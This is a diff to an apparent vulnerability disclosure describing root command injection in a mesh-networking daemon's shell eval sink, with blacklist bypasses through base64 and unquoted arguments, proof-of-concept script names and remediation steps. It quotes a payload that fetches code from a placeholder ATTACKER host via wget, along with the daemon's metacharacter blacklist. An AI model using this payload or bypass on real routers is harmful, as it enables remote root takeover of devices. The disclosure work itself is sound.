@@ -19,33 +19,59 @@ WAN-side L2 position.
 | **Direct CAP/LAN delivery** (`rce_poc.py`) | Reachable initialized CAP in the tested gate-open state (`get_netmode=0`, UCI `NETMODE` unset) | No | Main LAN / Wi-Fi | About four command characters | Emulation: daemon-driven root file |
 | **Direct factory RE/WAN delivery** (`re_wan_rce.py`) | Factory state (`INITTED!=YES`), selected WAN has DHCP/gateway state, rogue CAP wins discovery | No | WAN-side L2 | 32/64 reliable bytes; 36/66 encoder limits | Hardware: direct `uid=0(root)` callback |
 
-The rows are independent delivery choices. V1 is part of the first row because it
-supplies an admin `stok` for the full-size UCI payload plant. It is not a prerequisite
-of the V2 sink or of either direct delivery path.
+The rows are independent delivery choices. In `ota_rce.py`, V1 and V2 use separate
+`cab_meshd` connections: V1 stops after reading the CAP's type-6 sync and mints an
+admin `stok`; after the API plant, V2 opens a new connection and completes the
+`4 → 5 → 7` trigger. V1 supplies access for the full-size UCI payload plant. It is
+not a prerequisite of the V2 sink or of either direct delivery path.
 
-## Shared root cause
+## Shared sink and path-specific inputs
 
-The daemon attempts to screen shell metacharacters with `check_injection`
-(`0x9308`, blacklist at `0xe2c9`: `` @`$#,;'\"[]&*()|<> ``), but some attacker
-fields are base64-encoded before that check. The shell later decodes them and feeds
-the restored bytes into `eval` as root.
+All three V2 delivery paths converge on `mimesh_init.sh:717`, but they place
+attacker input there in three different ways:
 
-The common shell path is:
+- The V1-assisted OTA CAP path stores raw shell text in the Wi-Fi `encryption`
+  UCI values. `encryption` passes through the web API's `hackCheck`; the working
+  payload avoids its blocked characters and uses permitted `\"`, spaces, and `#`.
+  `do_cap_init` reads the stored value directly, so it never passes through the
+  daemon's separate `check_injection` blacklist.
+- The direct CAP/LAN path puts an attacker-computed base64 token, preceded by a
+  five-word positional pad, in the type-4 plant. `check_injection` (`0x9308`,
+  blacklist at `0xe2c9`: `` @`$#,;'\"[]&*()|<> ``) sees only the permitted pad
+  and base64 text; space is not in that blacklist. Unquoted `$@` moves the token
+  to `do_cap_init` `$6`, where `base64 -d` restores the shell expression before
+  the root `eval`.
+- In the RE/WAN path, the daemon itself base64-encodes raw type-6 backhaul fields
+  before `check_injection`; `do_re_init` later decodes them and restores the
+  screened metacharacters before the same root `eval`.
+
+The shared shell tail is:
 
 ```text
 mesh_connect.sh:6       source /lib/mimesh/mimesh_init.sh
-mesh_connect.sh:22      $@                         # unquoted, re-splits arguments
-do_cap_init/do_re_init  base64 -d selected fields
+do_cap_init/do_re_init  collect UCI or decoded wire values
                         build JSON for mimesh_init
 mimesh_init.sh:717      eval "$key=\"`json_get_value ...`\""
 ```
 
+For direct CAP/LAN, `mesh_connect.sh:22` invokes unquoted `$@`, which splits the
+single planted string into the five-word pad and the base64 token. On RE/WAN, the
+C template already emits separate positions; unquoted `$@` matters because empty
+earlier values are dropped and can shift the controlled backhaul fields away from
+`do_re_init` `$7/$8`.
+
 The C entry points differ:
 
-- CAP/LAN receives type-7 and calls the `cap_init` builder at `0xa3bc`, then
-  `system()` at `0xa598`.
+- Both CAP deliveries receive type-7 and call the `cap_init` builder at `0xa3bc`,
+  then `system()` at `0xa598`.
 - RE/WAN receives type-6 and calls the `re_init` builder at `0xa950`, then
   `system()` at `0xae94`.
+
+The CAP PoCs use the tested `4 → 5 → 7` exchange. The stock type-7 handler itself
+does not compare the connection state or validate an HMAC before calling the
+builder; in CAP/server mode it checks `body[0] == 1`. Type-4 remains necessary for
+the direct CAP/LAN PoC because that message carries its plant. `ota_rce.py` keeps
+the full tested exchange even though its payload was planted in UCI beforehand.
 
 The later `do_cap_init` shell gate blocks the sink for `NETMODE=whc_cap`, and for
 `NETMODE=lanapmode` together with `CAP_MODE=ap`. `do_re_init` has no equivalent
@@ -93,7 +119,8 @@ plant and V2 trigger remain the same. V1 is therefore a delivery dependency of
 
 ### Payload construction
 
-`encryption` is exempt from the web layer's `hackCheck`, so the two bands carry:
+The two values pass the web layer's `hackCheck` because they contain none of its
+blocked bytes (backtick, ``;|$&`` or newline):
 
 ```text
 2.4 GHz: \" wget http://ATTACKER:8000/s -O /tmp/x #
@@ -269,6 +296,6 @@ applies to the separate factory/WAN state.
 4. Remove `eval` from parsed mesh data; assign validated values without reparsing
    them as shell code.
 5. Treat decoded peer fields as opaque data instead of relying on a blacklist that
-   sees only base64.
+   sees only an allowed pad/base64 form on CAP or daemon-generated base64 on RE.
 
 See `remediation.md` for the complete vendor recommendations.
